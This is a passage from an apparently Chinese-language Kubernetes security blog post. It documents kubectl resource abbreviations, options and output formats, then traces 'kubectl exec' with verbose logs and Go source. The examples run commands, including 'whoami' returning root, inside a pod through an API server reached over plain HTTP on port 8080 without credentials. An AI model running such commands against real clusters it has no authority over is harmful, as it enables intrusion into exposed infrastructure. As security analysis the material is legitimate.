Use <span class="token string">"kubectl options"</span> <span class="token keyword">for</span> a list of global command-line options <span class="token punctuation">(</span>applies to all commands<span class="token punctuation">)</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>kubectl</code> 资源对象</p>
<table>
<thead>
<tr>
<th>资源对象的名称</th>
<th>缩写</th>
</tr>
</thead>
<tbody><tr>
<td>cluster</td>
<td></td>
</tr>
<tr>
<td>componentstatuses</td>
<td>cs</td>
</tr>
<tr>
<td>configmaps</td>
<td>cm</td>
</tr>
<tr>
<td>daemonsets</td>
<td>ds</td>
</tr>
<tr>
<td>deployments</td>
<td>deploy</td>
</tr>
<tr>
<td>endpoints</td>
<td>ep</td>
</tr>
<tr>
<td>events</td>
<td>ev</td>
</tr>
<tr>
<td>horizontalpodautoscalers</td>
<td>hpa</td>
</tr>
<tr>
<td>ingresses</td>
<td>ing</td>
</tr>
<tr>
<td>Jobs</td>
<td></td>
</tr>
<tr>
<td>limitranges</td>
<td>limits</td>
</tr>
<tr>
<td>nodes</td>
<td>no</td>
</tr>
<tr>
<td>namespaces</td>
<td>ns</td>
</tr>
<tr>
<td>networkpolicies</td>
<td></td>
</tr>
<tr>
<td>statefulsets</td>
<td></td>
</tr>
<tr>
<td>persistentvolumeclaims</td>
<td>pvc</td>
</tr>
<tr>
<td>persistentvolumes</td>
<td>pv</td>
</tr>
<tr>
<td>pods</td>
<td>po</td>
</tr>
<tr>
<td>podsecuritypolicies</td>
<td>psp</td>
</tr>
<tr>
<td>podtemplate</td>
<td></td>
</tr>
<tr>
<td>replicasets</td>
<td>rs</td>
</tr>
<tr>
<td>replicationcontrollers</td>
<td>rc</td>
</tr>
<tr>
<td>resourcequotas</td>
<td>quota</td>
</tr>
<tr>
<td>cronjob</td>
<td></td>
</tr>
<tr>
<td>secrets</td>
<td></td>
</tr>
<tr>
<td>serviceaccounts</td>
<td>sa</td>
</tr>
<tr>
<td>services</td>
<td>svc</td>
</tr>
<tr>
<td>storageclasses</td>
<td>sc</td>
</tr>
<tr>
<td>thirdpartyresources</td>
<td></td>
</tr>
</tbody></table>
<p><code>kubectl</code> 选项</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">>></span><span class="token operator">></span>: kubectl options
The following options can be passed to any command:
      --add-dir-header<span class="token operator">=</span>false: If true, adds the <span class="token function">file</span> directory to the header
      --alsologtostderr<span class="token operator">=</span>false: 同时输出日志到标准错误控制台和文件。
      --as<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">:</span> Username to impersonate <span class="token keyword">for</span> the operation
      --as-group<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>: Group to impersonate <span class="token keyword">for</span> the operation, this flag can be repeated to specify multiple groups.
      --cache-dir<span class="token operator">=</span><span class="token string">'C:\Users\Qftm\.kube\http-cache'</span><span class="token keyword">:</span> Default HTTP cache directory
      --certificate-authority<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">:</span> 用以进行认证授权的.cert文件路径。
      --client-certificate<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">:</span> TLS使用的客户端证书路径。
      --client-key<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">:</span> TLS使用的客户端密钥路径。
      --cluster<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">:</span> 指定使用的kubeconfig配置文件中的集群名。
      --context<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">:</span> 指定使用的kubeconfig配置文件中的环境名。
      --insecure-skip-tls-verify<span class="token operator">=</span>false: 如果为true，将不会检查服务器凭证的有效性，这会导致你的HTTPS链接变得不安全。
      --kubeconfig<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">:</span> 命令行请求使用的配置文件路径。
      --log-backtrace-at<span class="token operator">=</span>:0: 当日志长度超过定义的行数时，忽略堆栈信息。
      --log-dir<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">:</span> 如果不为空，将日志文件写入此目录。
      --log-file<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">:</span> If non-empty, use this log <span class="token function">file</span>
      --log-flush-frequency<span class="token operator">=</span>5s: 刷新日志的最大时间间隔。
      --log-file-max-size<span class="token operator">=</span>1800: Defines the maximum size a log <span class="token function">file</span> can grow to. Unit is megabytes. If the value is 0, the maximum <span class="token function">file</span> size is unlimited.
      --log-flush-frequency<span class="token operator">=</span>5s: Maximum number of seconds between log flushes
      --logtostderr<span class="token operator">=</span>true: 输出日志到标准错误控制台，不输出到文件。
      --match-server-version<span class="token punctuation">[</span><span class="token operator">=</span>false<span class="token punctuation">]</span>: 要求服务端和客户端版本匹配。
  -n, --namespace<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">:</span> 如果不为空，命令将使用此namespace。
      --password<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">:</span> API Server进行简单认证使用的密码。
      --profile<span class="token operator">=</span><span class="token string">'none'</span><span class="token keyword">:</span> Name of profile to capture. One of  <span class="token punctuation">(</span>none<span class="token operator">|</span>cpu<span class="token operator">|</span>heap<span class="token operator">|</span>goroutine<span class="token operator">|</span>threadcreate<span class="token operator">|</span>block<span class="token operator">|</span>mutex<span class="token punctuation">)</span>
      --profile-output<span class="token operator">=</span><span class="token string">'profile.pprof'</span><span class="token keyword">:</span> Name of the <span class="token function">file</span> to <span class="token function">write</span> the profile to
      --request-timeout<span class="token operator">=</span><span class="token string">'0'</span><span class="token keyword">:</span> The length of <span class="token function">time</span> to <span class="token function">wait</span> before giving up on a single server request. Non-zero values should contain a corresponding <span class="token function">time</span> unit <span class="token punctuation">(</span>e.g. 1s, 2m, 3h<span class="token punctuation">)</span>. A value of zero means don<span class="token string">'t timeout requests.
  -s, --server="": Kubernetes API Server的地址和端口号。
      --skip-headers=false: If true, avoid header prefixes in the log messages
      --skip-log-headers=false: If true, avoid headers when opening log files
      --stderrthreshold=2: 高于此级别的日志将被输出到错误控制台。
      --tls-server-name='</span>': Server name to use <span class="token keyword">for</span> server certificate validation. If it is not provided, the <span class="token function">hostname</span> used to contact the server is used
      --token<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">:</span> 认证到API Server使用的令牌。
      --user<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">:</span> 指定使用的kubeconfig配置文件中的用户名。
      --username<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">:</span> API Server进行简单认证使用的用户名。
  -v, --v<span class="token operator">=</span>0: 指定输出日志的级别。
      --vmodule<span class="token operator">=</span>: 指定输出日志的模块，格式如下：pattern<span class="token operator">=</span>N，使用逗号分隔。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>kubectl</code> 命令可以用多种格式对结果进行显示，输出的格式通过 <code>-o</code> 参数指定：</p>
<pre class="line-numbers language-bash"><code class="language-bash">kubectl <span class="token punctuation">[</span>command<span class="token punctuation">]</span> <span class="token punctuation">[</span>TYPE<span class="token punctuation">]</span> <span class="token punctuation">[</span>NAME<span class="token punctuation">]</span> -o<span class="token operator">=</span><span class="token operator">&lt;</span>output_format<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>根据不同子命令的输出结果，可选的输出格式如下表所示</p>
<table>
<thead>
<tr>
<th>输出格式</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>-o custom-columns=&lt;spec&gt;</td>
<td>根据自定义列名进行输出，以逗号分隔</td>
</tr>
<tr>
<td>-o custom-columns-file=&lt;filename&gt;</td>
<td>从文件中获取自定义列名进行输出</td>
</tr>
<tr>
<td>-o json</td>
<td>以JSON格式显示结果</td>
</tr>
<tr>
<td>-o jsonpath=&lt;template&gt;</td>
<td>输出jsonpath表达式定义的字段信息</td>
</tr>
<tr>
<td>-o jsonpath-file=&lt;filename&gt;</td>
<td>输出jsonpath表达式定义的字段信息，来源于文件</td>
</tr>
<tr>
<td>-o name</td>
<td>仅输出资源对象的名称</td>
</tr>
<tr>
<td>-o wide</td>
<td>输出额外信息。对于Pod，将输出Pod所在的Node名</td>
</tr>
<tr>
<td>-o yaml</td>
<td>以yaml格式显示结果</td>
</tr>
</tbody></table>
<h4 id="version-problem"><a href="#version-problem" class="headerlink" title="version problem"></a>version problem</h4><p>客户端和服务端构建的版本差异，一般情况下 <code>Client Version（kubectl）&lt;= Server Version（Kubernetes）</code> 才可以正常使用 <code>kubectl</code> 操作<code>Kubernetes Api</code>，差异如下：</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># Get version: Client Version（kubectl v1.18.0）> Server Version（Kubernetes v1.5.2）</span>
λ Qftm <span class="token operator">>></span><span class="token operator">></span>: kubectl_1.18.0 -s http://ip:8080/ version
Client Version: version.Info<span class="token punctuation">{</span>Major:<span class="token string">"1"</span>, Minor:<span class="token string">"18"</span>, GitVersion:<span class="token string">"v1.18.0"</span>, GitCommit:<span class="token string">"9e991415386e4cf155a24b1da15becaa390438d8"</span>, GitTreeState:<span class="token string">"clean"</span>, BuildDate:<span class="token string">"2020-03-25T14:58:59Z"</span>, GoVersion:<span class="token string">"go1.13.8"</span>, Compiler:<span class="token string">"gc"</span>, Platform:<span class="token string">"windows/amd64"</span><span class="token punctuation">}</span>
Server Version: version.Info<span class="token punctuation">{</span>Major:<span class="token string">"1"</span>, Minor:<span class="token string">"5"</span>, GitVersion:<span class="token string">"v1.5.2"</span>, GitCommit:<span class="token string">"269f928217957e7126dc87e6adfa82242bfe5b1e"</span>, GitTreeState:<span class="token string">"clean"</span>, BuildDate:<span class="token string">"2017-07-03T15:31:10Z"</span>, GoVersion:<span class="token string">"go1.7.4"</span>, Compiler:<span class="token string">"gc"</span>, Platform:<span class="token string">"linux/amd64"</span><span class="token punctuation">}</span>

<span class="token comment" spellcheck="true"># Client Version > Server Version, Get pod faile</span>
λ Qftm <span class="token operator">>></span><span class="token operator">></span>: kubectl_1.18.0 -s http://ip:8080/ get pods
Error from server <span class="token punctuation">(</span>NotAcceptable<span class="token punctuation">)</span>: the server was unable to respond with a content <span class="token function">type</span> that the client supports <span class="token punctuation">(</span>get pods<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># Client Version &lt;= Server Version, Get pod success</span>
λ Qftm <span class="token operator">>></span><span class="token operator">></span>: kubectl_1.5.2 -s http://ip:8080/ get pods
NAME                       READY     STATUS              RESTARTS   AGE
my-nginx-379829228-nfj36   0/1       ContainerCreating   0          1y

λ Qftm <span class="token operator">>></span><span class="token operator">></span>: kubectl_1.5.0 -s http://ip:8080/ get pods
NAME                       READY     STATUS              RESTARTS   AGE
my-nginx-379829228-nfj36   0/1       ContainerCreating   0          1y<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="exec-analysis"><a href="#exec-analysis" class="headerlink" title="exec analysis"></a>exec analysis</h4><p>kubectl exec 指令工作原理</p>
<p><img src="/2021/08/15/Kubernetes-Security/image-20220307182903119-16473541254925.png" alt="image-20220307182903119"></p>
<p>通过指定 <code>-v 9</code> 查看 <code>kubectl exec (POD | TYPE/NAME) [-c CONTAINER] [flags] -- COMMAND [args...] [options]</code> 执行的详细过程</p>
<pre class="line-numbers language-bash"><code class="language-bash">λ Qftm <span class="token operator">>></span><span class="token operator">></span>: kubectl_1.15.0 -s http://ip:8080 <span class="token function">exec</span> worker-deployment-9f4656f5d-5b5d5 -n default -c worker -v 9 -- <span class="token function">whoami</span>
I0307 15:48:26.895337   53484 round_trippers.go:419<span class="token punctuation">]</span> curl -k -v -XGET  -H <span class="token string">"Accept: application/json, */*"</span> -H <span class="token string">"User-Agent: kubectl_1.15.0/v1.15.0 (windows/amd64) kubernetes/e8462b5"</span> <span class="token string">'http://ip:8080/api/v1/namespaces/default/pods/worker-deployment-9f4656f5d-5b5d5'</span>
I0307 15:48:26.997173   53484 round_trippers.go:438<span class="token punctuation">]</span> GET http://ip:8080/api/v1/namespaces/default/pods/worker-deployment-9f4656f5d-5b5d5 200 OK <span class="token keyword">in</span> 99 milliseconds
I0307 15:48:26.998174   53484 round_trippers.go:444<span class="token punctuation">]</span> Response Headers:
I0307 15:48:26.999148   53484 round_trippers.go:447<span class="token punctuation">]</span>     Audit-Id: f954a7aa-cf91-43ec-92de-f6fffbdd0652
I0307 15:48:26.999148   53484 round_trippers.go:447<span class="token punctuation">]</span>     Content-Type: application/json
I0307 15:48:27.000125   53484 round_trippers.go:447<span class="token punctuation">]</span>     Date: Mon, 07 Mar 2022 07:48:30 GMT
I0307 15:48:27.000125   53484 request.go:947<span class="token punctuation">]</span> Response Body: <span class="token punctuation">{</span><span class="token string">"kind"</span><span class="token keyword">:</span><span class="token string">"Pod"</span>,<span class="token string">"apiVersion"</span><span class="token keyword">:</span><span class="token string">"v1"</span>,<span class="token string">"metadata"</span>:<span class="token punctuation">{</span><span class="token string">"name"</span><span class="token keyword">:</span><span class="token string">"worker-deployment-9f4656f5d-5b5d5"</span>,<span class="token string">"generateName"</span><span class="token keyword">:</span><span class="token string">"worker-deployment-9f4656f5d-"</span>,<span class="token string">"namespace"</span><span class="token keyword">:</span><span class="token string">"default"</span>,<span class="token string">"selfLink"</span><span class="token keyword">:</span><span class="token string">"/api/v1/namespaces/default/pods/worker-deployment-9f4656f5d-5b5d5"</span>,<span class="token string">"uid"</span><span class="token keyword">:</span><span class="token string">"a31405ea-d008-4426-859b-36a634b457bb"</span>,<span class="token string">"resourceVersion"</span><span class="token keyword">:</span><span class="token string">"490175"</span>,<span class="token string">"creationTimestamp"</span><span class="token keyword">:</span><span class="token string">"2022-01-28T15:54:12Z"</span>,<span class="token string">"labels"</span>:<span class="token punctuation">{</span><span class="token string">"app"</span><span class="token keyword">:</span><span class="token string">"worker"</span>,<span class="token string">"pod-template-hash"</span><span class="token keyword">:</span><span class="token string">"9f4656f5d"</span><span class="token punctuation">}</span>,<span class="token string">"annotations"</span>:<span class="token punctuation">{</span><span class="token string">"cni.projectcalico.org/podIP"</span><span class="token keyword">:</span><span class="token string">"172.7.81.16/32"</span>,<span class="token string">"cni.projectcalico.org/podIPs"</span><span class="token keyword">:</span><span class="token string">"172.7.81.16/32"</span><span class="token punctuation">}</span>,<span class="token string">"ownerReferences"</span>:<span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"apiVersion"</span><span class="token keyword">:</span><span class="token string">"apps/v1"</span>,<span class="token string">"kind"</span><span class="token keyword">:</span><span class="token string">"ReplicaSet"</span>,<span class="token string">"name"</span><span class="token keyword">:</span><span class="token string">"worker-deployment-9f4656f5d"</span>,<span class="token string">"uid"</span><span class="token keyword">:</span><span class="token string">"e0606b7f-9457-499e-b126-39d613e8dc60"</span>,<span class="token string">"controller"</span>:true,<span class="token string">"blockOwnerDeletion"</span>:true<span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span>,<span class="token string">"spec"</span>:<span class="token punctuation">{</span><span class="token string">"volumes"</span>:<span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"name"</span><span class="token keyword">:</span><span class="token string">"default-token-qct6n"</span>,<span class="token string">"secret"</span>:<span class="token punctuation">{</span><span class="token string">"secretName"</span><span class="token keyword">:</span><span class="token string">"default-token-qct6n"</span>,<span class="token string">"defaultMode"</span>:420<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">]</span>,<span class="token string">"containers"</span>:<span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"name"</span><span class="token keyword">:</span><span class="token string">"worker"</span>,<span class="token string">"image"</span><span class="token keyword">:</span><span class="token string">"z0unt1ng/httpd"</span>,<span class="token string">"command"</span>:<span class="token punctuation">[</span><span class="token string">"/bin/bash"</span>,<span class="token string">"-c"</span>,<span class="token string">"./httpd"</span><span class="token punctuation">]</span>,<span class="token string">"resources"</span>:<span class="token punctuation">{</span><span class="token string">"limits"</span>:<span class="token punctuation">{</span><span class="token string">"cpu"</span><span class="token keyword">:</span><span class="token string">"300m"</span><span class="token punctuation">}</span>,<span class="token string">"requests"</span>:<span class="token punctuation">{</span><span class="token string">"cpu"</span><span class="token keyword">:</span><span class="token string">"300m"</span><span class="token punctuation">}</span><span class="token punctuation">}</span>,<span class="token string">"volumeMounts"</span>:<span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"name"</span><span class="token keyword">:</span><span class="token string">"default-token-qct6n"</span>,<span class="token string">"readOnly"</span>:true,<span class="token string">"mountPath"</span><span class="token keyword">:</span><span class="token string">"/var/run/secrets/kubernetes.io/serviceaccount"</span><span class="token punctuation">}</span><span class="token punctuation">]</span>,<span class="token string">"terminationMessagePath"</span><span class="token keyword">:</span><span class="token string">"/dev/termination-log"</span>,<span class="token string">"terminationMessagePolicy"</span><span class="token keyword">:</span><span class="token string">"File"</span>,<span class="token string">"imagePullPolicy"</span><span class="token keyword">:</span><span class="token string">"Always"</span><span class="token punctuation">}</span><span class="token punctuation">]</span>,<span class="token string">"restartPolicy"</span><span class="token keyword">:</span><span class="token string">"Always"</span>,<span class="token string">"terminationGracePeriodSeconds"</span>:30,<span class="token string">"dnsPolicy"</span><span class="token keyword">:</span><span class="token string">"None"</span>,<span class="token string">"serviceAccountName"</span><span class="token keyword">:</span><span class="token string">"default"</span>,<span class="token string">"serviceAccount"</span><span class="token keyword">:</span><span class="token string">"default"</span>,<span class="token string">"nodeName"</span><span class="token keyword">:</span><span class="token string">"192.168.0.18"</span>,<span class="token string">"securityContext"</span>:<span class="token punctuation">{</span><span class="token punctuation">}</span>,<span class="token string">"schedulerName"</span><span class="token keyword">:</span><span class="token string">"default-scheduler"</span>,<span class="token string">"tolerations"</span>:<span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"key"</span><span class="token keyword">:</span><span class="token string">"node.kubernetes.io/not-ready"</span>,<span class="token string">"operator"</span><span class="token keyword">:</span><span class="token string">"Exists"</span>,<span class="token string">"effect"</span><span class="token keyword">:</span><span class="token string">"NoExecute"</span>,<span class="token string">"tolerationSeconds"</span>:300<span class="token punctuation">}</span>,<span class="token punctuation">{</span><span class="token string">"key"</span><span class="token keyword">:</span><span class="token string">"node.kubernetes.io/unreachable"</span>,<span class="token string">"operator"</span><span class="token keyword">:</span><span class="token string">"Exists"</span>,<span class="token string">"effect"</span><span class="token keyword">:</span><span class="token string">"NoExecute"</span>,<span class="token string">"tolerationSeconds"</span>:300<span class="token punctuation">}</span><span class="token punctuation">]</span>,<span class="token string">"priority"</span>:0,<span class="token string">"dnsConfig"</span>:<span class="token punctuation">{</span><span class="token string">"nameservers"</span>:<span class="token punctuation">[</span><span class="token string">"8.8.8.8"</span><span class="token punctuation">]</span>,<span class="token string">"searches"</span>:<span class="token punctuation">[</span><span class="token string">"ns1.svc.cluster.local"</span>,<span class="token string">"my.dns.search.suffix"</span><span class="token punctuation">]</span>,<span class="token string">"options"</span>:<span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"name"</span><span class="token keyword">:</span><span class="token string">"ndots"</span>,<span class="token string">"value"</span><span class="token keyword">:</span><span class="token string">"2"</span><span class="token punctuation">}</span>,<span class="token punctuation">{</span><span class="token string">"name"</span><span class="token keyword">:</span><span class="token string">"edns0"</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span>,<span class="token string">"enableServiceLinks"</span>:true<span class="token punctuation">}</span>,<span class="token string">"status"</span>:<span class="token punctuation">{</span><span class="token string">"phase"</span><span class="token keyword">:</span><span class="token string">"Running"</span>,<span class="token string">"conditions"</span>:<span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"type"</span><span class="token keyword">:</span><span class="token string">"Initialized"</span>,<span class="token string">"status"</span><span class="token keyword">:</span><span class="token string">"True"</span>,<span class="token string">"lastProbeTime"</span>:null,<span class="token string">"lastTransitionTime"</span><span class="token keyword">:</span><span class="token string">"2022-01-28T15:54:13Z"</span><span class="token punctuation">}</span>,<span class="token punctuation">{</span><span class="token string">"type"</span><span class="token keyword">:</span><span class="token string">"Ready"</span>,<span class="token string">"status"</span><span class="token keyword">:</span><span class="token string">"True"</span>,<span class="token string">"lastProbeTime"</span>:null,<span class="token string">"lastTransitionTime"</span><span class="token keyword">:</span><span class="token string">"2022-01-28T15:54:50Z"</span><span class="token punctuation">}</span>,<span class="token punctuation">{</span><span class="token string">"type"</span><span class="token keyword">:</span><span class="token string">"ContainersReady"</span>,<span class="token string">"status"</span><span class="token keyword">:</span><span class="token string">"True"</span>,<span class="token string">"lastProbeTime"</span>:null,<span class="token string">"lastTransitionTime"</span><span class="token keyword">:</span><span class="token string">"2022-01-28T15:54:50Z"</span><span class="token punctuation">}</span>,<span class="token punctuation">{</span><span class="token string">"type"</span><span class="token keyword">:</span><span class="token string">"PodScheduled"</span>,<span class="token string">"status"</span><span class="token keyword">:</span><span class="token string">"True"</span>,<span class="token string">"lastProbeTime"</span>:null,<span class="token string">"lastTransitionTime"</span><span class="token keyword">:</span><span class="token string">"2022-01-28T15:54:13Z"</span><span class="token punctuation">}</span><span class="token punctuation">]</span>,<span class="token string">"hostIP"</span><span class="token keyword">:</span><span class="token string">"192.168.0.18"</span>,<span class="token string">"podIP"</span><span class="token keyword">:</span><span class="token string">"172.7.81.16"</span>,<span class="token string">"startTime"</span><span class="token keyword">:</span><span class="token string">"2022-01-28T15:54:13Z"</span>,<span class="token string">"containerStatuses"</span>:<span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"name"</span><span class="token keyword">:</span><span class="token string">"worker"</span>,<span class="token string">"state"</span>:<span class="token punctuation">{</span><span class="token string">"running"</span>:<span class="token punctuation">{</span><span class="token string">"startedAt"</span><span class="token keyword">:</span><span class="token string">"2022-01-28T15:54:49Z"</span><span class="token punctuation">}</span><span class="token punctuation">}</span>,<span class="token string">"lastState"</span>:<span class="token punctuation">{</span><span class="token punctuation">}</span>,<span class="token string">"ready"</span>:true,<span class="token string">"restartCount"</span>:0,<span class="token string">"image"</span><span class="token keyword">:</span><span class="token string">"z0unt1ng/httpd:latest"</span>,<span class="token string">"imageID"</span><span class="token keyword">:</span><span class="token string">"docker-pullable://z0unt1ng/httpd@sha256:968ffb046a80cedde89a200ac2b68f4b2604c9605b9890709f99b0b180d2433d"</span>,<span class="token string">"containerID"</span><span class="token keyword">:</span><span class="token string">"docker://dffcf435bf74644c865b20019661c52412a97992614249e18dc18468907c56b8"</span><span class="token punctuation">}</span><span class="token punctuation">]</span>,<span class="token string">"qosClass"</span><span class="token keyword">:</span><span class="token string">"Burstable"</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
I0307 15:48:27.012094   53484 round_trippers.go:419<span class="token punctuation">]</span> curl -k -v -XPOST  -H <span class="token string">"X-Stream-Protocol-Version: v4.channel.k8s.io"</span> -H <span class="token string">"X-Stream-Protocol-Version: v3.channel.k8s.io"</span> -H <span class="token string">"X-Stream-Protocol-Version: v2.channel.k8s.io"</span> -H <span class="token string">"X-Stream-Protocol-Version: channel.k8s.io"</span> -H <span class="token string">"User-Agent: kubectl_1.15.0/v1.15.0 (windows/amd64) kubernetes/e8462b5"</span> <span class="token string">'http://ip:8080/api/v1/namespaces/default/pods/worker-deployment-9f4656f5d-5b5d5/exec?command=whoami&amp;container=worker&amp;stderr=true&amp;stdout=true'</span>
I0307 15:48:27.141979   53484 round_trippers.go:438<span class="token punctuation">]</span> POST http://ip:8080/api/v1/namespaces/default/pods/worker-deployment-9f4656f5d-5b5d5/exec?command<span class="token operator">=</span>whoami<span class="token operator">&amp;</span>container<span class="token operator">=</span>worker<span class="token operator">&amp;</span>stderr<span class="token operator">=</span>true<span class="token operator">&amp;</span>stdout<span class="token operator">=</span>true 101 Switching Protocols <span class="token keyword">in</span> 128 milliseconds
I0307 15:48:27.144001   53484 round_trippers.go:444<span class="token punctuation">]</span> Response Headers:
I0307 15:48:27.144973   53484 round_trippers.go:447<span class="token punctuation">]</span>     Connection: Upgrade
I0307 15:48:27.145968   53484 round_trippers.go:447<span class="token punctuation">]</span>     Upgrade: SPDY/3.1
I0307 15:48:27.145968   53484 round_trippers.go:447<span class="token punctuation">]</span>     X-Stream-Protocol-Version: v4.channel.k8s.io
I0307 15:48:27.146966   53484 round_trippers.go:447<span class="token punctuation">]</span>     Date: Mon, 07 Mar 2022 07:48:30 GMT
root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>log</code> 里面涉及到两个 <code>http</code> 请求过程</p>
<ul>
<li>第一个<code>HTTP GET</code> 请求，调用 <code>/api/v1/namespaces/&lt;namespace&gt;/pods/&lt;pod&gt;</code> 接口获取指定 <code>Pod</code> 的详细信息</li>
<li>第二个<code>HTTP POST</code> 请求，调用 <code>/api/v1/namespaces/&lt;namespace&gt;/pods/&lt;pod/exec</code> 接口（<code>Pod</code> 的子资源 <code>exec</code>）在指定 <code>Container</code> 内执行命令</li>
</ul>
<p><code>kubectl</code> 发起的包含 <code>exec</code> 子资源的 POST 请求，代码片段如下：<code>/staging/src/k8s.io/kubectl/pkg/cmd/exec/exec.go</code></p>
<blockquote>
<p>子资源（subresource）隶属于某个 K8S 资源，表示为父资源下方的子路径，例如 <code>/logs</code>、<code>/status</code>、<code>/scale</code>、<code>/exec</code> 等。其中每个子资源支持的操作根据对象的不同而改变。</p>
</blockquote>
<pre class="line-numbers language-go"><code class="language-go">    fn <span class="token operator">:=</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">error</span> <span class="token punctuation">{</span>
        restClient<span class="token punctuation">,</span> err <span class="token operator">:=</span> restclient<span class="token punctuation">.</span><span class="token function">RESTClientFor</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>Config<span class="token punctuation">)</span>
        <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> err
        <span class="token punctuation">}</span>

        <span class="token comment" spellcheck="true">// TODO: consider abstracting into a client invocation or client helper</span>
        req <span class="token operator">:=</span> restClient<span class="token punctuation">.</span><span class="token function">Post</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>
            <span class="token function">Resource</span><span class="token punctuation">(</span><span class="token string">"pods"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>
            <span class="token function">Name</span><span class="token punctuation">(</span>pod<span class="token punctuation">.</span>Name<span class="token punctuation">)</span><span class="token punctuation">.</span>
            <span class="token function">Namespace</span><span class="token punctuation">(</span>pod<span class="token punctuation">.</span>Namespace<span class="token punctuation">)</span><span class="token punctuation">.</span>
            <span class="token function">SubResource</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">)</span>
        req<span class="token punctuation">.</span><span class="token function">VersionedParams</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>corev1<span class="token punctuation">.</span>PodExecOptions<span class="token punctuation">{</span>
            Container<span class="token punctuation">:</span> containerName<span class="token punctuation">,</span>
            Command<span class="token punctuation">:</span>   p<span class="token punctuation">.</span>Command<span class="token punctuation">,</span>
            Stdin<span class="token punctuation">:</span>     p<span class="token punctuation">.</span>Stdin<span class="token punctuation">,</span>
            Stdout<span class="token punctuation">:</span>    p<span class="token punctuation">.</span>Out <span class="token operator">!=</span> <span class="token boolean">nil</span><span class="token punctuation">,</span>
            Stderr<span class="token punctuation">:</span>    p<span class="token punctuation">.</span>ErrOut <span class="token operator">!=</span> <span class="token boolean">nil</span><span class="token punctuation">,</span>
            TTY<span class="token punctuation">:</span>       t<span class="token punctuation">.</span>Raw<span class="token punctuation">,</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> scheme<span class="token punctuation">.</span>ParameterCodec<span class="token punctuation">)</span>

        <span class="token keyword">return</span> p<span class="token punctuation">.</span>Executor<span class="token punctuation">.</span><span class="token function">Execute</span><span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span><span class="token function">URL</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> p<span class="token punctuation">.</span>Config<span class="token punctuation">,</span> p<span class="token punctuation">.</span>In<span class="token punctuation">,</span> p<span class="token punctuation">.</span>Out<span class="token punctuation">,</span> p<span class="token punctuation">.</span>ErrOut<span class="token punctuation">,</span> t<span class="token punctuation">.</span>Raw<span class="token punctuation">,</span> sizeQueue<span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>抓包分析 kubectl 在 container 内执行命令的网络请求过程</p>
<pre><code># kubectl
